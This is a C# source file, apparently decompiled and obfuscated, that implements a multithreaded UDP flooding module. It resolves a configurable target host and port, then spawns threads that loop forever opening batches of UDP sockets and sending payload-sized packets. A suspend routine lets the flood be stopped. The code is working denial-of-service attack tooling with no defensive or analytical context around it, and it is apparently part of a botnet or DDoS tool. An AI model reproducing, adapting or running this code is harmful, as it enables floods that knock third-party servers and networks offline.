using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ns0;

internal class Class7
{
	private class Class8
	{
		private IPEndPoint IPEo;

		private int iPSize;

		private Socket[] pSocket;

		private int iUDPSockets;

		public Class8(IPEndPoint ipendPoint_0, int int_0, int int_1)
		{
			IPEo = ipendPoint_0;
			iUDPSockets = int_0;
			iPSize = int_1;
		}

		public void method_0()
		{
			while (true)
			{
				byte[] buffer = new byte[iPSize];
				try
				{
					pSocket = new Socket[iUDPSockets];
					for (int i = 0; i < iUDPSockets; i++)
					{
						pSocket[i] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						pSocket[i].Blocking = false;
						pSocket[i].SendTo(buffer, IPEo);
					}
					Thread.Sleep(100);
					for (int i = 0; i < iUDPSockets; i++)
					{
						if (pSocket[i].Connected)
						{
							pSocket[i].Disconnect(reuseSocket: false);
						}
						pSocket[i].Close();
						pSocket[i] = null;
					}
					pSocket = null;
				}
				catch
				{
					for (int i = 0; i < iUDPSockets; i++)
					{
						try
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] tFloodingJob;

	private static Thread[] tFloodingThread;

	public static string sFHost;

	private static IPEndPoint IPEo;

	public static ushort uPort;

	public static int iPSize;

	private static Class8[] UDPClass;

	public static int iThreads;

	public static int iUDPSockets;

	public static void smethod_0()
	{
		try
		{
			IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], uPort);
		}
		catch
		{
			IPEo = new IPEndPoint(IPAddress.Parse(sFHost), uPort);
		}
		tFloodingThread = new Thread[iThreads];
		tFloodingJob = new ThreadStart[iThreads];
		UDPClass = new Class8[iThreads];
		for (int i = 0; i < iThreads; i++)
		{
			UDPClass[i] = new Class8(IPEo, iUDPSockets, iPSize);
			tFloodingJob[i] = UDPClass[i].method_0;
			tFloodingThread[i] = new Thread(tFloodingJob[i]);
			tFloodingThread[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < iThreads; i++)
		{
			try
			{
				tFloodingThread[i].Suspend();
			}
			catch
			{
			}
		}
	}
}
